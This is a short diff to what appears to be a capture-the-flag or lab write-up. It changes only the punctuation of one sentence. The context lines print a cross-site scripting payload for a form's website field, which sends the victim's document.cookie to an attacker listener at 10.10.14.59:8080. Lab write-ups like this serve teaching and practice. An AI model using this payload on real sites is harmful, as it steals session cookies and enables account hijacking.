@@ -20,6 +20,6 @@ Then send the below payload in the website field and submit the form:
 '><script>new Image().src='http://10.10.14.59:8080?c='+document.cookie;</script>
 ```
 
-After a few seconds you should receive the payload with the cookie.
+After a few seconds you should receive the payload with the cookie!
 
 
